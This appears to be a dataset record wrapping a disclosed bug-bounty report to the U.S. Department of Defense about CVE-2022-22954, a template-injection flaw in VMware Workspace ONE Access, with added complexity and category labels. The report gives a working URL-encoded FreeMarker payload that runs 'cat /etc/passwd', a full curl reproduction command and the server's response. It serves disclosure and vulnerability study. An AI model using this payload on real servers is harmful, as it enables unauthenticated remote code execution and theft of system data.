{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "fulldash ",
  "title": "\u2588\u2588\u2588 vulnerable to CVE-2022-22954",
  "content": "\nI found that one of the targets belongs to DOD vulnerable to CVE-2022-22954 where an attacker may be able to execute any malicious code like escalating Remote code execution is also possible\nTechnical Summary:\nCVE-2022-22954 is a server-side template injection vulnerability in the VMware Workspace ONE Access and Identity Manager. This vulnerability was assigned a CVSSv3 score of 9.8. An unauthenticated attacker with network access could exploit this vulnerability by sending a specially crafted request to a vulnerable VMware Workspace ONE or Identity Manager. Successful exploitation could result in remote code execution by exploiting a server-side template injection flaw.\nVulnerable URL:\n\u2588\u2588\u2588=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d\nImpact\nThe impact of server-side template injection vulnerabilities is generally critical, resulting in remote code execution by taking full control of the back-end server. Even without the code execution, the attacker may be able to read sensitive data on the server\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588, \u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nVMware workspace one\nCVE Numbers\nCVE-2022-22954\nSteps to Reproduce\nRun the following curl command\nCommand Used:\ncurl -sk -X GET -H \"Host: \u2588\u2588\u2588\u2588\u2588\u2588\" \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d\"\nResponse:\nCode 1.19 KiB\n1<!DOCTYPE HTML>\n2<html xmlns=\"http://www.w3.org/1999/html\">\n3    <head>\n4        <title>Error Page</title>\n5        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\" />\n6        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n7        <link rel=\"stylesheet\" type=\"text/css\" href=\"/catalog-portal/css/errorpage.css\">\n8    </head>\n9\n10    <body>\n11        <div class=\"error-container\">\n12            <div class=\"error-img-container\">\n13                <img src=\"/catalog-portal/app/graphics/warning.svg\" class=\"warning-icon\">\n14            </div>\n15            <div class=\"error-text-heading\">Request Failed</div>\n16            <div class=\"error-text-container\">\n17                <p>Please contact your IT Administrator.</p>\n18                <a href=\"/catalog-portal/ui/logout?error=&deviceUdid=$%7B%22freemarker.template.utility.Execute%22?new()(%22cat%20/etc/passwd%22)%7D\">Sign Out</a>\n19            </div>\n20        </div>\n21    </body>\n22    <script>\n23        if(console && console.log) {\n24            console.log(\"auth.context.invalid\");\n25            console.log(\"Authorization context is not valid. Login request  received with tenant code: uhhz-lbr-004v, device id: \u2588\u2588\u2588\u2588\u2588;\n26        }\n27    </script>\n28</html>\nAs you can see the above response, which contains the response of /etc/passwd in the response\nSuggested Mitigation/Remediation Actions\nUpgrade the instances to the latest version\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1650500160,
  "report_url": "https://hackerone.com/reports/1537694",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Identify a target system running VMware Workspace ONE Access or Identity Manager."
    ],
    [
      2,
      "Send a specially crafted HTTP GET request with a server-side template injection payload to the vulnerable URL."
    ],
    [
      3,
      "Observe the response for evidence of remote code execution, such as the contents of '/etc/passwd' being returned."
    ]
  ],
  "vuln_description": "CVE-2022-22954 is a server-side template injection vulnerability in VMware Workspace ONE Access and Identity Manager, allowing unauthenticated remote code execution via a crafted HTTP request.",
  "reason": "The attack involves a single, straightforward step of sending a crafted request to a known vulnerable endpoint. The payload is a standard template injection, and the interaction is direct with no need for complex state manipulation or novel logic.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability report describes a server-side template injection (SSTI) leading to remote code execution (RCE) in VMware Workspace ONE Access and Identity Manager. This is not an authentication or authorization (AuthN/AuthZ) bypass issue, nor is it an Insecure Direct Object Reference (IDOR) issue. The proposed methodologies focus on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, which does not apply to SSTI vulnerabilities. SSTI involves injecting malicious templates into server-side processing, which is a different class of vulnerability.",
    "is_detectable": false
  }
}